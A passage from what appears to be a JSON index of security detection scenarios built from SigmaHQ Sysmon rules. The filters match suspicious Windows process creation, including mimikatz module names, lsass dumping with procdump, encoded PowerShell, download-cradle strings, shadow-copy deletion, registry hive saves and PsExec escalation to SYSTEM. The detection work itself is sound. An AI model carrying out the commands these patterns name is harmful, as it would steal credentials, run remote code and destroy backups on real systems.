Files\\\\Amazon\\\\WorkSpacesConfig\\\\Scripts\\\\check-workspacehealth.ps1' || evt.Parsed.ParentCommandLine contains '\\\\nessus_' || evt.Parsed.CommandLine contains '\\\\nessus_' || evt.Parsed.ParentImage endsWith '\\\\mshta.exe' && evt.Parsed.Image endsWith '\\\\mshta.exe' && evt.Parsed.ParentCommandLine contains 'C:\\\\MEM_Configmgr_' && evt.Parsed.ParentCommandLine contains '\\\\splash.hta' && evt.Parsed.ParentCommandLine contains '{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}' && evt.Parsed.CommandLine contains 'C:\\\\MEM_Configmgr_' && evt.Parsed.CommandLine contains '\\\\SMSSETUP\\\\BIN\\\\' && evt.Parsed.CommandLine contains '\\\\autorun.hta' && evt.Parsed.CommandLine contains '{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.005\n   - attack.t1059.001\n   - attack.t1218\n\n  label: \"Windows Shell/Scripting Processes Spawning Suspicious Programs\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_shell_spawn_susp_program.yml", "version": "0.2", "versions": {"0.1": {"digest": "f3d68cb3171ed6c128f5a3f61d304f6fb30f50b5ee0571206f709b1a66af6793"}, "0.2": {"digest": "ed6ce236bd15c29468dcb30b9bc52c173e2ddda7bc5e1cc283fa569548423666"}}}, "sigmahq/proc_creation_win_susp_system_user_anomaly": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_system_user_anomaly\ndescription: |\n  Detects a suspicious process creation as SYSTEM user (suspicious program or command line parameter)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.IntegrityLevel == 'System' && (evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI') && (evt.Parsed.Image endsWith '\\\\calc.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\forfiles.exe' || evt.Parsed.Image endsWith '\\\\hh.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\ping.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.CommandLine contains ' -NoP ' || evt.Parsed.CommandLine contains ' -W Hidden ' || evt.Parsed.CommandLine contains ' -decode ' || evt.Parsed.CommandLine contains ' /decode ' || evt.Parsed.CommandLine contains ' /urlcache ' || evt.Parsed.CommandLine contains ' -urlcache ' || Match(' -e JAB', evt.Parsed.CommandLine) || Match(' -e SUVYI', evt.Parsed.CommandLine) || Match(' -e SQBFAFgA', evt.Parsed.CommandLine) || Match(' -e aWV4I', evt.Parsed.CommandLine) || Match(' -e IAB', evt.Parsed.CommandLine) || Match(' -e PAA', evt.Parsed.CommandLine) || Match(' -e aQBlAHgA', evt.Parsed.CommandLine) || evt.Parsed.CommandLine contains 'vssadmin delete shadows' || evt.Parsed.CommandLine contains 'reg SAVE HKLM' || evt.Parsed.CommandLine contains ' -ma ' || evt.Parsed.CommandLine contains 'Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' || evt.Parsed.CommandLine contains '.downloadstring(' || evt.Parsed.CommandLine contains '.downloadfile(' || evt.Parsed.CommandLine contains ' /ticket:' || evt.Parsed.CommandLine contains 'dpapi::' || evt.Parsed.CommandLine contains 'event::clear' || evt.Parsed.CommandLine contains 'event::drop' || evt.Parsed.CommandLine contains 'id::modify' || evt.Parsed.CommandLine contains 'kerberos::' || evt.Parsed.CommandLine contains 'lsadump::' || evt.Parsed.CommandLine contains 'misc::' || evt.Parsed.CommandLine contains 'privilege::' || evt.Parsed.CommandLine contains 'rpc::' || evt.Parsed.CommandLine contains 'sekurlsa::' || evt.Parsed.CommandLine contains 'sid::' || evt.Parsed.CommandLine contains 'token::' || evt.Parsed.CommandLine contains 'vault::cred' || evt.Parsed.CommandLine contains 'vault::list' || evt.Parsed.CommandLine contains ' p::d ' || evt.Parsed.CommandLine contains ';iex(' || evt.Parsed.CommandLine contains 'MiniDump' || evt.Parsed.CommandLine contains 'net user ') && not (evt.Parsed.CommandLine contains 'ping 127.0.0.1 -n' || evt.Parsed.Image endsWith '\\\\PING.EXE' && evt.Parsed.ParentCommandLine contains '\\\\DismFoDInstall.cmd' || evt.Parsed.ParentImage contains ':\\\\Packages\\\\Plugins\\\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\\' || (evt.Parsed.ParentImage contains ':\\\\Program Files (x86)\\\\Java\\\\' || evt.Parsed.ParentImage contains ':\\\\Program Files\\\\Java\\\\') && evt.Parsed.ParentImage endsWith '\\\\bin\\\\javaws.exe' && (evt.Parsed.Image contains ':\\\\Program Files (x86)\\\\Java\\\\' || evt.Parsed.Image contains ':\\\\Program Files\\\\Java\\\\') && evt.Parsed.Image endsWith '\\\\bin\\\\jp2launcher.exe' && evt.Parsed.CommandLine contains ' -ma '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1134\n   - attack.t1003\n   - attack.t1027\n\n  label: \"Suspicious SYSTEM User Process Creation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious process creation as SYSTEM user (suspicious program or command line parameter)\n", "path": "scenarios/sigmahq/proc_creation_win_susp_system_user_anomaly.yml", "version": "0.2", "versions": {"0.1": {"digest": "9f2954c9592551ab4d779f1ab9714b999b6c5e19859754319cacf43692db420f"}, "0.2": {"digest": "b9b68dcf5418d98525f34b34bb82d78fda6c7d613494d849bf273bdb180c3d3c"}}}, "sigmahq/proc_creation_win_susp_task_folder_evasion": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_task_folder_evasion\ndescription: |\n  The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'echo ' || evt.Parsed.CommandLine contains 'copy ' || evt.Parsed.CommandLine contains 'type ' || evt.Parsed.CommandLine contains 'file createnew') && (evt.Parsed.CommandLine contains ' C:\\\\Windows\\\\System32\\\\Tasks\\\\' || evt.Parsed.CommandLine contains ' C:\\\\Windows\\\\SysWow64\\\\Tasks\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.002\n\n  label: \"Tasks Folder Evasion\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr \n", "path": "scenarios/sigmahq/proc_creation_win_susp_task_folder_evasion.yml", "version": "0.2", "versions": {"0.1": {"digest": "bdb7ba26ffe8de0c01b714a37a2313ee98a73fb3b8e48967a058fbf215938484"}, "0.2": {"digest": "ff579a56d4622d15dd7683d3168c13e8e49e55fe16ac95a9ba3de857416bde5f"}}}, "sigmahq/proc_creation_win_susp_whoami_as_param": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_whoami_as_param\ndescription: |\n  Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '.exe whoami')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1033\n\n  label: \"WhoAmI as Parameter\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)\n", "path": "scenarios/sigmahq/proc_creation_win_susp_whoami_as_param.yml", "version": "0.2", "versions": {"0.1": {"digest": "2e493d2eee3294e45915a0f4fe196711c3689068a6070dcc9ea83d577a9c2527"}, "0.2": {"digest": "eb93ea0b6aee5ced68a90b7a094a9e860cb19ba748730b8cb44c8606724060f6"}}}, "sigmahq/proc_creation_win_susp_workfolders": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_workfolders\ndescription: |\n  Detects using WorkFolders.exe to execute an arbitrary control.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\control.exe' && evt.Parsed.ParentImage endsWith '\\\\WorkFolders.exe' && not (evt.Parsed.Image == 'C:\\\\Windows\\\\System32\\\\control.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Execution via WorkFolders.exe\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects using WorkFolders.exe to execute an arbitrary control.exe\n", "path": "scenarios/sigmahq/proc_creation_win_susp_workfolders.yml", "version": "0.2", "versions": {"0.1": {"digest": "e9a03af04660f937308baaf0e746af1f6077fae91db093ad206b1e69ba9d7535"}, "0.2": {"digest": "69e11242945181a84c3c3e60763736dcf253d59c2b375e77bf706b9bad26c6f9"}}}, "sigmahq/proc_creation_win_svchost_execution_with_no_cli_flags": {"content": "type: trigger\nname: sigmahq/proc_creation_win_svchost_execution_with_no_cli_flags\ndescription: |\n  It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine endsWith 'svchost.exe' && evt.Parsed.Image endsWith '\\\\svchost.exe' && not (evt.Parsed.ParentImage endsWith '\\\\rpcnet.exe' || evt.Parsed.ParentImage endsWith '\\\\rpcnetp.exe' || evt.Parsed.CommandLine == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1055\n\n  label: \"Suspect Svchost Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.\n", "path": "scenarios/sigmahq/proc_creation_win_svchost_execution_with_no_cli_flags.yml", "version": "0.2", "versions": {"0.1": {"digest": "4a7bbf2025879134f418249c71f82a2a84e8ea3a0ef0d682452587e9d1e9af20"}, "0.2": {"digest": "7504024d0693f0b111d3316551f8c90d2f5ab015e909d1800a3e4fa7c51107d8"}}}, "sigmahq/proc_creation_win_svchost_termserv_proc_spawn": {"content": "type: trigger\nname: sigmahq/proc_creation_win_svchost_termserv_proc_spawn\ndescription: |\n  Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentCommandLine contains '\\\\svchost.exe' && evt.Parsed.ParentCommandLine contains 'termsvcs' && not (evt.Parsed.Image endsWith '\\\\rdpclip.exe' || evt.Parsed.Image endsWith ':\\\\Windows\\\\System32\\\\csrss.exe' || evt.Parsed.Image endsWith ':\\\\Windows\\\\System32\\\\wininit.exe' || evt.Parsed.Image endsWith ':\\\\Windows\\\\System32\\\\winlogon.exe' || evt.Parsed.Image == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1190\n   - attack.t1210\n\n  label: \"Terminal Service Process Spawn\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708)\n", "path": "scenarios/sigmahq/proc_creation_win_svchost_termserv_proc_spawn.yml", "version": "0.2", "versions": {"0.1": {"digest": "8e1d7d2729955572107aa850b4eb8597f68c5dc59ffacf7f289537a6fa49bbdd"}, "0.2": {"digest": "3d559b7c85df262a18bb51c68cc56bdfc3bdc2f2e4e7fc7ef90fb5c20d38f6bd"}}}, "sigmahq/proc_creation_win_sysinternals_adexplorer_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_adexplorer_susp_execution\ndescription: |\n  Detects the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database to a suspicious directory.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\ADExplorer.exe' || evt.Parsed.OriginalFileName == 'AdExp') && evt.Parsed.CommandLine contains 'snapshot' && (evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1552.001\n   - attack.t1003.003\n\n  label: \"Suspicious Active Directory Database Snapshot Via ADExplorer\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database to a suspicious directory.\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_adexplorer_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "e643a7129874748ee1ddd4e0c781e0d6d8656ba78786a00faa8325ffe6d4858e"}, "0.2": {"digest": "df8899569508b53f2f0a03e03b60391a78c2d87916232425d5753c3dff68bed6"}}}, "sigmahq/proc_creation_win_sysinternals_procdump_evasion": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_procdump_evasion\ndescription: |\n  Detects uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'copy procdump' || evt.Parsed.CommandLine contains 'move procdump' || evt.Parsed.CommandLine contains 'copy ' && evt.Parsed.CommandLine contains '.dmp ' && (evt.Parsed.CommandLine contains '2.dmp' || evt.Parsed.CommandLine contains 'lsass' || evt.Parsed.CommandLine contains 'out.dmp') || evt.Parsed.CommandLine contains 'copy lsass.exe_' || evt.Parsed.CommandLine contains 'move lsass.exe_')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1003.001\n\n  label: \"Potential SysInternals ProcDump Evasion\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_procdump_evasion.yml", "version": "0.2", "versions": {"0.1": {"digest": "75c1357fc16de4652548cb99d0f160fa5bbab0d94aeb82d92cc46eb6439306de"}, "0.2": {"digest": "e90221071846267c31088e0f25ea4738d16503acc9b6146dbb7d557d32f1c8f3"}}}, "sigmahq/proc_creation_win_sysinternals_procdump_lsass": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_procdump_lsass\ndescription: |\n  Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we are also able to catch cases in which the attacker has renamed the procdump executable. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' -ma ' || evt.Parsed.CommandLine contains ' /ma ' || evt.Parsed.CommandLine contains ' \u2013ma ' || evt.Parsed.CommandLine contains ' \u2014ma ' || evt.Parsed.CommandLine contains ' \u2015ma ') && evt.Parsed.CommandLine contains ' ls')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1003.001\n\n  label: \"Potential LSASS Process Dump Via Procdump\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we are also able to catch cases in which the attacker has renamed the procdump executable. \n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_procdump_lsass.yml", "version": "0.2", "versions": {"0.1": {"digest": "1df9990dac1c7e8e588b815ac1d7a52842230a6a07520d6d64662852ada5f96a"}, "0.2": {"digest": "62094b7a15d1a53ad06e8c484fb221d3fdd5df1cb762f2bf0397768ebcd12a67"}}}, "sigmahq/proc_creation_win_sysinternals_psexec_paexec_escalate_system": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_psexec_paexec_escalate_system\ndescription: |\n  Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' -s cmd' || evt.Parsed.CommandLine contains ' /s cmd' || evt.Parsed.CommandLine contains ' \u2013s cmd' || evt.Parsed.CommandLine contains ' \u2014s cmd' || evt.Parsed.CommandLine contains ' \u2015s cmd' || evt.Parsed.CommandLine contains ' -s -i cmd' || evt.Parsed.CommandLine contains ' -s /i cmd' || evt.Parsed.CommandLine contains ' -s \u2013i cmd' || evt.Parsed.CommandLine contains ' -s \u2014i cmd' || evt.Parsed.CommandLine contains ' -s \u2015i cmd' || evt.Parsed.CommandLine contains ' /s -i cmd' || evt.Parsed.CommandLine contains ' /s /i cmd' || evt.Parsed.CommandLine contains ' /s \u2013i cmd' || evt.Parsed.CommandLine contains ' /s \u2014i cmd' || evt.Parsed.CommandLine contains ' /s \u2015i cmd' || evt.Parsed.CommandLine contains ' \u2013s -i cmd' || evt.Parsed.CommandLine contains ' \u2013s /i cmd' || evt.Parsed.CommandLine contains ' \u2013s \u2013i cmd' || evt.Parsed.CommandLine contains ' \u2013s \u2014i cmd' || evt.Parsed.CommandLine contains ' \u2013s \u2015i cmd' || evt.Parsed.CommandLine contains ' \u2014s -i cmd' || evt.Parsed.CommandLine contains ' \u2014s /i cmd' || evt.Parsed.CommandLine contains ' \u2014s \u2013i cmd' || evt.Parsed.CommandLine contains ' \u2014s \u2014i cmd' || evt.Parsed.CommandLine contains ' \u2014s \u2015i cmd' || evt.Parsed.CommandLine contains ' \u2015s -i cmd' || evt.Parsed.CommandLine contains ' \u2015s /i cmd' || evt.Parsed.CommandLine contains ' \u2015s \u2013i cmd' || evt.Parsed.CommandLine contains ' \u2015s \u2014i cmd' || evt.Parsed.CommandLine contains ' \u2015s \u2015i cmd' || evt.Parsed.CommandLine contains ' -i -s cmd' || evt.Parsed.CommandLine contains ' -i /s cmd' || evt.Parsed.CommandLine contains ' -i \u2013s cmd' || evt.Parsed.CommandLine contains ' -i \u2014s cmd' || evt.Parsed.CommandLine contains ' -i \u2015s cmd' || evt.Parsed.CommandLine contains ' /i -s cmd' || evt.Parsed.CommandLine contains ' /i /s cmd' || evt.Parsed.CommandLine contains ' /i \u2013s cmd' || evt.Parsed.CommandLine contains ' /i \u2014s cmd' || evt.Parsed.CommandLine contains ' /i \u2015s cmd' || evt.Parsed.CommandLine contains ' \u2013i -s cmd' || evt.Parsed.CommandLine contains ' \u2013i /s cmd' || evt.Parsed.CommandLine contains ' \u2013i \u2013s cmd' || evt.Parsed.CommandLine contains ' \u2013i \u2014s cmd' || evt.Parsed.CommandLine contains ' \u2013i \u2015s cmd' || evt.Parsed.CommandLine contains ' \u2014i -s cmd' || evt.Parsed.CommandLine contains ' \u2014i /s cmd' || evt.Parsed.CommandLine contains ' \u2014i \u2013s cmd' || evt.Parsed.CommandLine contains ' \u2014i \u2014s cmd' || evt.Parsed.CommandLine contains ' \u2014i \u2015s cmd' || evt.Parsed.CommandLine contains ' \u2015i -s cmd' || evt.Parsed.CommandLine contains ' \u2015i /s cmd' || evt.Parsed.CommandLine contains ' \u2015i \u2013s cmd' || evt.Parsed.CommandLine contains ' \u2015i \u2014s cmd' || evt.Parsed.CommandLine contains ' \u2015i \u2015s cmd' || evt.Parsed.CommandLine contains ' -s pwsh' || evt.Parsed.CommandLine contains ' /s pwsh' || evt.Parsed.CommandLine contains ' \u2013s pwsh' || evt.Parsed.CommandLine contains ' \u2014s pwsh' || evt.Parsed.CommandLine contains ' \u2015s pwsh' || evt.Parsed.CommandLine contains ' -s -i pwsh' || evt.Parsed.CommandLine contains ' -s /i pwsh' || evt.Parsed.CommandLine contains ' -s \u2013i pwsh' || evt.Parsed.CommandLine contains ' -s \u2014i pwsh' || evt.Parsed.CommandLine contains ' -s \u2015i pwsh' || evt.Parsed.CommandLine contains ' /s -i pwsh' || evt.Parsed.CommandLine contains ' /s /i pwsh' || evt.Parsed.CommandLine contains ' /s \u2013i pwsh' || evt.Parsed.CommandLine contains ' /s \u2014i pwsh' || evt.Parsed.CommandLine contains ' /s \u2015i pwsh' || evt.Parsed.CommandLine contains ' \u2013s -i pwsh' || evt.Parsed.CommandLine contains ' \u2013s /i pwsh' || evt.Parsed.CommandLine contains ' \u2013s \u2013i pwsh' || evt.Parsed.CommandLine contains ' \u2013s \u2014i pwsh' || evt.Parsed.CommandLine contains ' \u2013s \u2015i pwsh' || evt.Parsed.CommandLine contains ' \u2014s -i pwsh' || evt.Parsed.CommandLine contains ' \u2014s /i pwsh' || evt.Parsed.CommandLine contains ' \u2014s \u2013i pwsh' || evt.Parsed.CommandLine contains ' \u2014s \u2014i pwsh' || evt.Parsed.CommandLine contains ' \u2014s \u2015i pwsh' || evt.Parsed.CommandLine contains ' \u2015s -i pwsh' || evt.Parsed.CommandLine contains ' \u2015s /i pwsh' || evt.Parsed.CommandLine contains ' \u2015s \u2013i pwsh' || evt.Parsed.CommandLine contains ' \u2015s \u2014i pwsh' || evt.Parsed.CommandLine contains ' \u2015s \u2015i pwsh' || evt.Parsed.CommandLine contains ' -i -s pwsh' || evt.Parsed.CommandLine contains ' -i /s pwsh' || evt.Parsed.CommandLine contains ' -i \u2013s pwsh' || evt.Parsed.CommandLine contains ' -i \u2014s pwsh' || evt.Parsed.CommandLine contains ' -i \u2015s pwsh' || evt.Parsed.CommandLine contains ' /i -s pwsh' || evt.Parsed.CommandLine contains ' /i /s pwsh' || evt.Parsed.CommandLine contains ' /i \u2013s pwsh' || evt.Parsed.CommandLine contains ' /i \u2014s pwsh' || evt.Parsed.CommandLine contains ' /i \u2015s pwsh' || evt.Parsed.CommandLine contains ' \u2013i -s pwsh' || evt.Parsed.CommandLine contains ' \u2013i /s pwsh' || evt.Parsed.CommandLine contains ' \u2013i \u2013s pwsh' || evt.Parsed.CommandLine contains ' \u2013i \u2014s pwsh' || evt.Parsed.CommandLine contains ' \u2013i \u2015s pwsh' || evt.Parsed.CommandLine contains ' \u2014i -s pwsh' || evt.Parsed.CommandLine contains ' \u2014i /s pwsh' || evt.Parsed.CommandLine contains ' \u2014i \u2013s pwsh' || evt.Parsed.CommandLine contains ' \u2014i \u2014s pwsh' || evt.Parsed.CommandLine contains ' \u2014i \u2015s pwsh' || evt.Parsed.CommandLine contains ' \u2015i -s pwsh' || evt.Parsed.CommandLine contains ' \u2015i /s pwsh' || evt.Parsed.CommandLine contains ' \u2015i \u2013s pwsh' || evt.Parsed.CommandLine contains ' \u2015i \u2014s pwsh' || evt.Parsed.CommandLine contains ' \u2015i \u2015s pwsh' || evt.Parsed.CommandLine contains ' -s powershell' || evt.Parsed.CommandLine contains ' /s powershell' || evt.Parsed.CommandLine contains ' \u2013s powershell' || evt.Parsed.CommandLine contains ' \u2014s powershell' || evt.Parsed.CommandLine contains ' \u2015s powershell' || evt.Parsed.CommandLine contains ' -s -i powershell' || evt.Parsed.CommandLine contains ' -s /i powershell' || evt.Parsed.CommandLine contains ' -s \u2013i powershell' || evt.Parsed.CommandLine contains ' -s \u2014i powershell' || evt.Parsed.CommandLine contains ' -s \u2015i powershell' || evt.Parsed.CommandLine contains ' /s -i powershell' || evt.Parsed.CommandLine contains ' /s /i powershell' || evt.Parsed.CommandLine contains ' /s \u2013i powershell' || evt.Parsed.CommandLine contains ' /s \u2014i powershell' || evt.Parsed.CommandLine contains ' /s \u2015i powershell' || evt.Parsed.CommandLine contains ' \u2013s -i powershell' || evt.Parsed.CommandLine contains ' \u2013s /i powershell' || evt.Parsed.CommandLine contains ' \u2013s \u2013i powershell' || evt.Parsed.CommandLine contains ' \u2013s \u2014i powershell' || evt.Parsed.CommandLine contains ' \u2013s \u2015i powershell' || evt.Parsed.CommandLine contains ' \u2014s -i powershell' || evt.Parsed.CommandLine contains ' \u2014s /i powershell' || evt.Parsed.CommandLine contains ' \u2014s \u2013i powershell' || evt.Parsed.CommandLine contains ' \u2014s \u2014i powershell' || evt.Parsed.CommandLine contains ' \u2014s \u2015i powershell' || evt.Parsed.CommandLine contains ' \u2015s -i powershell' || evt.Parsed.CommandLine contains ' \u2015s /i powershell' || evt.Parsed.CommandLine contains ' \u2015s \u2013i powershell' || evt.Parsed.CommandLine contains ' \u2015s \u2014i powershell' || evt.Parsed.CommandLine contains ' \u2015s \u2015i powershell' || evt.Parsed.CommandLine contains ' -i -s powershell' || evt.Parsed.CommandLine contains ' -i /s powershell' || evt.Parsed.CommandLine contains ' -i \u2013s powershell' || evt.Parsed.CommandLine contains ' -i \u2014s powershell' || evt.Parsed.CommandLine contains ' -i \u2015s powershell' || evt.Parsed.CommandLine contains ' /i -s powershell' || evt.Parsed.CommandLine contains ' /i /s powershell' || evt.Parsed.CommandLine contains ' /i \u2013s powershell' || evt.Parsed.CommandLine contains ' /i \u2014s powershell' || evt.Parsed.CommandLine contains ' /i \u2015s powershell' || evt.Parsed.CommandLine contains ' \u2013i -s powershell' || evt.Parsed.CommandLine contains ' \u2013i /s powershell' || evt.Parsed.CommandLine contains ' \u2013i \u2013s powershell' || evt.Parsed.CommandLine contains ' \u2013i \u2014s powershell' || evt.Parsed.CommandLine contains ' \u2013i \u2015s powershell' || evt.Parsed.CommandLine contains ' \u2014i -s powershell' || evt.Parsed.CommandLine contains ' \u2014i /s powershell' || evt.Parsed.CommandLine contains ' \u2014i \u2013s powershell' || evt.Parsed.CommandLine contains ' \u2014i \u2014s powershell' || evt.Parsed.CommandLine contains ' \u2014i \u2015s powershell' || evt.Parsed.CommandLine contains ' \u2015i -s powershell' || evt.Parsed.CommandLine contains ' \u2015i /s powershell' || evt.Parsed.CommandLine contains ' \u2015i \u2013s powershell' || evt.Parsed.CommandLine contains ' \u2015i \u2014s powershell' || evt.Parsed.CommandLine contains ' \u2015i \u2015s powershell') && (evt.Parsed.CommandLine contains 'psexec' || evt.Parsed.CommandLine contains 'paexec' || evt.Parsed.CommandLine contains 'accepteula'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1587.001\n\n  label: \"PsExec/PAExec Escalation to LOCAL SYSTEM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_psexec_paexec_escalate_system.yml", "version": "0.2", "versions": {"0.1": {"digest": "32afae3f2180b5b29e993a7e6d5c8c7c6dd225b320ddbf39627847213c6d2138"}, "0.2": {"digest": "52ebd7e5c1ae2c0541d0867c76361cf650b83a36e4f0e64591b712ebe1416dbd"}}}, "sigmahq/proc_creation_win_sysinternals_psexec_remote_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_psexec_remote_execution\ndescription: |\n  Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'accepteula' && evt.Parsed.CommandLine contains ' -u ' && evt.Parsed.CommandLine contains ' -p ' && evt.Parsed.CommandLine contains ' \\\\\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1587.001\n\n  label: \"Potential PsExec Remote Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_psexec_remote_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "99eb209ac1410580849156c5bf4bd17428548c51095802c12e7d3353e8da87b1"}, "0.2": {"digest": "820e4d43ab217159956c3336b699646c19c62d944ad1157c3059ab64b0bfc12a"}}}, "sigmahq/proc_creation_win_sysinternals_psexesvc_as_system": 